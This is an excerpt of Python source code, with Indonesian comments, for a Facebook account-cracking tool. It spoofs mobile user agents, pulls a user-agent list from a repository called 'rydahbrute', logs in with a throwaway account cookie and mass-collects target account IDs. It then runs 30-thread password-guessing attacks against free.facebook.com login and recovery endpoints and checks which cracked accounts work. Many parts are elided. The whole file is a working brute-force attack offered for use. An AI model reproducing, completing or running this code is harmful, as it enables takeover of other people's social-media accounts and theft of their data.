...
for xd in range(10000):
	...
	d='CPU OS 13_0 like Mac OS X)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0'
	...
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4622.82'
...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/RydahXyber/rydahbrute/main/useragent.txt').text
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tÃ— Saran Ektensi : [green]Cookiedough[white] Ã—'))
		...
		print(f'  {x}[{h}â€¢{x}]{h} Log in succes silahkan ketik lagi perintah nya ðŸ¤™{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s Log in failed silahkan cek akun tumbal ðŸ¤™%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def dump_massal():
	...
	try:
		print('')
		print(f'>> IDYang TerkumpulðŸ”¥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#			id2.insert(xx,bacot)
		...
		exit()
	print(f'1. login from {B}m.facebook.com{x} (lambat)')
#	print(f'2. login from {B}free.facebook.com{x} (sangat cepat)')
#	print(f'3. login from {B}x.facebook.com{x} (cepat)')
#	print(f'4. login from {B}mbasic.facebook.com{x} (semi cepat + lambat)')
	print('')
	hc = input('+ mode : ')
	if hc in ['1','01']:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}â€¢{k}â€¢{h}â€¢{x} crack sedang berjalan ðŸ¤™ {m}â€¢{k}â€¢{h}â€¢{x} <<<<< ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]âœ“[green] Crack Selesai, Jangan Lupa Bersyukur[cyan] âœ“[white] '))
...
def crack(idf,pwv):
	...
	ua = 'Mozilla/5.0 (Linux; Android 12; 21121210G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 FB_IAB/FB4A;FBAV/383.1.0.25.106'
	ua2 = 'Mozilla/5.0 (Linux; Android 11; TECNO AC8 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 FB_IAB/FB4A;FBAV/384.1.0.29.111'
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			po = ses.post('https://free.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Ffree.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Y538 Build/HuaweiY538) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/112.0.0.20.70;]'
			ses = requests.Session()
